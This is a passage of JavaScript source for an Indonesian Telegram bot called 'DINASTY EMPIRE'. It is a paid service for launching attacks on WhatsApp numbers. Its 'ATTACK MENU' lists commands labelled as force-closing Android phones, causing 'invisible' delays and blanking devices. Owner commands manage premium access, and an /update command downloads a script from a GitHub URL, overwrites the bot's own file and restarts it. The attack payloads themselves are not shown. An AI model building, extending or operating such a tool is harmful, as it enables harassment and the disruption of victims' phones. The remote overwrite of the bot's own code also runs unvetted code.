      𖤐 【 Profile 】 𖤐 

𖤐 Creator : @ArdieDINASTY
𖤐 Version : 0.2.1 VIP
𖤐 User : ${ctx.from.first_name}
  
  
 🔥𖤐【 ATTACK MENU 】𖤐🔥

𖤐/xflower 628×× [FC Andro]   
𖤐/kilerXit 628×× [Delay Invisible]
𖤐/powerXip 628×× [Invisible iPhone] 
𖤐/znxOne 628×× [Blank Android]  
𖤐/ultraSQL 628×× [Hard Delay]
───────────────────────────
\`\`\``;
    const keyboard = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "menu_back" }]] };
    try { await ctx.editMessageMedia({ type: 'photo', media: photoUrlMenu, caption: menuMessage, parse_mode: "Markdown" }, { reply_markup: keyboard }); } catch(e) { await ctx.answerCbQuery(); }
});

bot.action("menu_controls", async (ctx) => {
    if (!isOwner(ctx.from.id)) { await ctx.answerCbQuery("Hanya untuk owner!", { show_alert: true }); return; }
    const ownerMenu = `\`\`\`Js
⟡ D I N A S T Y   E M P I R E  ⟡
───────────────────────────
  ( 𖤐𖤐𖤐 ) – ダィエンパイア・シーズン
     
   𖤐 【 Profile 】 𖤐

𖤐 Creator : @ArdieDINASTY
𖤐 Version : 0.2.1 VIP
𖤐 User : ${ctx.from.first_name}


🔥𖤐【 OWNER MENU】𖤐🔥

𖤐/resetbot
𖤐/connect 628××
𖤐/addprem [id] [hari]
𖤐/delprem [id]
𖤐/lock [command]
𖤐/unlock [command]
𖤐/locklist
𖤐/lockall
𖤐/unlockall
𖤐/update [script Up]
───────────────────────────
\`\`\``;
    const keyboard = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "menu_back" }]] };
    try { await ctx.editMessageCaption(ownerMenu, { parse_mode: "Markdown", reply_markup: keyboard }); } catch(e) { await ctx.answerCbQuery(); }
});

bot.action("menu_back", async (ctx) => {
    const menuMessage = `\`\`\`JS
⟡ D I N A S T Y   E M P I R E  ⟡
───────────────────────────
  ( 𖤐𖤐𖤐 ) – ダィエンパイア・シーズン
     
  𖤐 【 Profile 】 𖤐

𖤐 Creator : @ArdieDINASTY
𖤐 Version : 0.2.1 VIP
𖤐 User : ${ctx.from.first_name}
  
  
  
 𖤐 【 bot status 】 𖤐 

𖤐 Sender  : ${isWhatsAppConnected ? '✅ Active' : '❌ Inactive'}
𖤐 Premium : ${isPremiumUser(ctx.from.id) ? '🔥 Premium' : '❌ No Premium'}
───────────────────────────
\`\`\``;
    const keyboard = {
        inline_keyboard: [
            [{ text: "⚔️ DINASTY", callback_data: "menu_attack" }],
            [{ text: "⚙️ CONTROL", callback_data: "menu_controls" }],
            [{ text: "🌐 INFORMATION", url: "https://t.me/ardievht404" }]
        ]
    };
    try { await ctx.editMessageCaption(menuMessage, { parse_mode: "Markdown", reply_markup: keyboard }); } catch(e) { await ctx.answerCbQuery(); }
});

// Error handler untuk semua error Telegram
bot.catch((err, ctx) => {
    console.error(`❌ Error: ${err.message}`);
});
//github update
bot.command("update", async (ctx) => {
    // Hanya owner yang bisa update
    if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner yang bisa update bot!");
    
    const repoRaw = "https://raw.githubusercontent.com/hoki93/database/refs/heads/main/zetsu.js";
    
    await ctx.reply("⏳ Sedang mengecek update...");
    
    try {
        const { data } = await axios.get(repoRaw);
        
        if (!data) return ctx.reply("❌ Update gagal: File kosong!");
        
        // Backup file lama
        const backupPath = `./zetsu.js.bak.${Date.now()}`;
        fs.copyFileSync("./zetsu.js", backupPath);
        console.log(`📁 Backup tersimpan: ${backupPath}`);
        
        // Tulis file baru
        fs.writeFileSync("./zetsu.js", data);
        
        await ctx.reply(`✅ *UPDATE BERHASIL!*\n\n📁 Backup: ${backupPath}\n🔄 Bot akan restart...`, { parse_mode: "Markdown" });
        
        setTimeout(() => {
            process.exit(0);
        }, 2000);
        
    } catch (e) {
        console.error(e);
        await ctx.reply("❌ Update gagal. Pastikan repo dan file tersedia.\nCek log untuk detail error.");
    }
});

bot.command("version", async (ctx) => {
    if (!isOwner(ctx.from.id)) return;
    
    const packageJson = JSON.parse(fs.readFileSync("./package.json"));
    const stats = fs.statSync("./zetsu.js");
    const lastModified = moment(stats.mtime).tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');
    
    await ctx.reply(`📦 *BOT VERSION INFO*\n\n📌 Nama: ${packageJson.name || "DINASTY EMPIRE"}\n🔢 Versi: ${packageJson.version || "VIP 2.1"}\n📅 Last Update: ${lastModified}\n👤 Owner: @ArdieDINASTY`, { parse_mode: "Markdown" });
});
// ========== START BOT ==========
bot.launch().then(() => console.log(chalk.green('✅ Bot Telegram aktif'))).catch(err => console.error('Gagal launch bot:', err));

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
